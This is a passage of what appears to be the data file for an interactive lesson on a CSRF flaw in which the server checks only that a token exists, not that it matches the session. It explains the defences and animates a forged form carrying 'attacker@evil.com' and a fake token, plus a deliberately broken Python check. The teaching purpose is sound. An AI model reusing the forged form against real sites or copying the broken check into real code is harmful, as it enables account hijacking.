          "Submitting any value — 'fake', 'x', an empty string — succeeded because the validation was missing.",
          "A CSRF token only protects against forgery if the server validates that the submitted value matches the one it generated for this session.",
          "This is one of the most common CSRF token failures: the infrastructure is in place, but the actual check was never implemented.",
        ],
      },
      defense: {
        summary: "Generate a secret per-session token, embed it in every form, and validate it on every submission — checking that it matches the session, not just that it exists.",
        measures: [
          {
            title: "Always compare the submitted token against the session token",
            body: "Use a constant-time comparison (secrets.compare_digest in Python, crypto.timingSafeEqual in Node) to prevent timing attacks. Reject the request if the token is missing, blank, or mismatched.",
          },
          {
            title: "Never accept a blank or predictable token",
            body: "A token of '' or '0' or 'token' is worse than no token — it creates false confidence. Generate tokens with a cryptographically secure source (secrets.token_hex, os.urandom) and ensure empty submissions are rejected outright.",
          },
        ],
      },
      animation: [
        {
          type: "block",
          label: "forged form with fake token",
          accent: "red",
          delay: 0,
          segments: [
            { text: '<input name="email" value="attacker@evil.com">\n', cls: "text-orange-300" },
            { text: '<input name="csrf_token" value="', cls: "text-gray-400", delay: 0.3 },
            { text: "fake", cls: "text-red-400 font-bold", delay: 0.4 },
            { text: '">', cls: "text-gray-400", delay: 0.4 },
            { text: "\n↑ attacker sets token to any value", cls: "block text-xs text-red-500 mt-1", delay: 0.7 },
          ],
        },
        {
          type: "arrow",
          label: "POST sent with fake token + session cookie",
          delay: 0.9,
        },
        {
          type: "block",
          label: "server validation — broken",
          accent: "orange",
          delay: 1.1,
          segments: [
            { text: "# actual server code\n", cls: "text-gray-500" },
            { text: "token = request.form.get('csrf_token')\n", cls: "text-gray-300", delay: 1.2 },
            { text: "if token:\n", cls: "text-yellow-300", delay: 1.3 },
            { text: "    proceed()  ", cls: "text-gray-300", delay: 1.4 },
            { text: "# ← never checks session token!", cls: "text-red-400", delay: 1.5 },
            { text: "\n✓ 'fake' is truthy — email changed", cls: "block text-xs text-green-400 mt-1.5", delay: 1.8 },
          ],
        },
        {
          type: "legend",
          delay: 2.0,
          items: [
            { code: "token present", codeCls: "text-yellow-400", desc: "server checks the field exists — not that the value is correct", delay: 2.0 },
            { code: "no comparison", codeCls: "text-red-400", desc: "session token is never fetched or compared — the check is purely structural", delay: 2.2 },
          ],
        },
      ],
    },
  ],
};
